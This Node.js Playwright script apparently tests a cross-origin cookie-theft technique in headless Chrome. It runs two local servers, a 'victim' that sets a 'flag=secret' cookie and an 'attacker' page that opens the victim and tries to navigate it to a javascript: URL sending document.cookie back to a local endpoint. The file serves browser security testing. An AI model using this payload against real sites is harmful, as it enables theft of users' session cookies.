const http = require('node:http');
const { chromium } = require('/Users/mbz/.cache/codex-runtimes/codex-primary-runtime/dependencies/node/node_modules/playwright');

function listen(port, handler) {
  return new Promise(resolve => {
    const server = http.createServer(handler);
    server.listen(port, '127.0.0.1', () => resolve(server));
  });
}

(async () => {
  let hit = null;
  const victim = await listen(8911, (req, res) => {
    if (req.url === '/victim') {
      res.writeHead(200, {
        'Content-Type': 'text/html',
        'Set-Cookie': 'flag=secret; Path=/',
      });
      res.end('<!doctype html><title>victim</title><h1>victim</h1>');
      return;
    }
    if (req.url.startsWith('/hit')) {
      hit = req.url;
      res.end('ok');
      return;
    }
    res.writeHead(404).end('no');
  });
  const attacker = await listen(8912, (req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<!doctype html><script>
      const w = open('http://127.0.0.1:8911/victim');
      setTimeout(() => {
        try {
          w.location = 'javascript:fetch("http://127.0.0.1:8911/hit?c="+encodeURIComponent(document.cookie))';
        } catch (e) {
          fetch('http://127.0.0.1:8911/hit?err=' + encodeURIComponent(e.message));
        }
      }, 500);
    </script>`);
  });

  const browser = await chromium.launch({
    executablePath: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
    headless: true,
  });
  const page = await browser.newPage();
  await page.goto('http://127.0.0.1:8912/');
  await page.waitForTimeout(2000);
  console.log(JSON.stringify({ hit }, null, 2));
  await browser.close();
  victim.close();
  attacker.close();
})().catch(err => {
  console.error(err);
  process.exit(1);
});
